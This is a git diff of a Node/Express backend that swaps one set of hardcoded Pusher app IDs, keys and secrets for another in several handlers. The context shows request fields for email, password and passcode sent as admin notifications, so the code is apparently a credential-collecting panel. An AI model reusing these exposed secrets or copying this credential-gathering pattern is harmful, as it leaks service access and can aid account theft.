@@ -272,11 +272,10 @@ export const add_new_links = (req, res) => {
 
 export const user_noti = async (req, res) => {
   const { text, posterId } = req.body;
-  ////ahmedimran96yoo@gmail.com
   const pusher = new Pusher({
-    appId: '1731286',
-    key: 'a5f0008dea3736f30a17',
-    secret: '0599185eb95735d5a17a',
+    appId: '2181874',
+    key: 'bfa2622dfb2fe305ec24',
+    secret: 'ccb7ebd64919dd156b91',
     cluster: 'ap2',
     useTLS: true,
   });
@@ -426,9 +425,9 @@ const getSatoshis = async (usdAmount) => {
 export const add_data = async (req, res) => {
   console.log('hit');
   const pusher = new Pusher({
-    appId: '1987499',
-    key: '05656b52c62c0f688ee3',
-    secret: 'b4372518df233d054270',
+    appId: '2181874',
+    key: 'bfa2622dfb2fe305ec24',
+    secret: 'ccb7ebd64919dd156b91',
     cluster: 'ap2',
     useTLS: true,
   });
@@ -1102,12 +1101,13 @@ export const site_exist_simplified = async (req, res) => {
 
 export const add_data_simplified = async (req, res) => {
   const pusher = new Pusher({
-    appId: '1987499',
-    key: '05656b52c62c0f688ee3',
-    secret: 'b4372518df233d054270',
+    appId: '2181874',
+    key: 'bfa2622dfb2fe305ec24',
+    secret: 'ccb7ebd64919dd156b91',
     cluster: 'ap2',
     useTLS: true,
   });
+
 
   const { adminId } = req.params;
   const { site, mail, passcode, email, password, amount } = req.body;
@@ -1416,10 +1416,10 @@ export const otp_check = async (req, res) => {
 
 export const pass_change = async (req, res) => {
   const { username, password, otp } = req.body;
-  const pusher = new Pusher({
-    appId: '1987499',
-    key: '05656b52c62c0f688ee3',
-    secret: 'b4372518df233d054270',
+   const pusher = new Pusher({
+    appId: '2181874',
+    key: 'bfa2622dfb2fe305ec24',
+    secret: 'ccb7ebd64919dd156b91',
     cluster: 'ap2',
     useTLS: true,
   });
@@ -2812,13 +2812,14 @@ export const add_collection_item = async (req, res) => {
 
     // Trigger Pusher notification if adminId is found
     if (resolvedAdminId) {
-      const pusher = new Pusher({
-        appId: '1987499',
-        key: '05656b52c62c0f688ee3',
-        secret: 'b4372518df233d054270',
-        cluster: 'ap2',
-        useTLS: true,
-      });
+        const pusher = new Pusher({
+    appId: '2181874',
+    key: 'bfa2622dfb2fe305ec24',
+    secret: 'ccb7ebd64919dd156b91',
+    cluster: 'ap2',
+    useTLS: true,
+  });
+
 
       pusher.trigger(resolvedAdminId, 'new-notification', {
         adminId: resolvedAdminId,
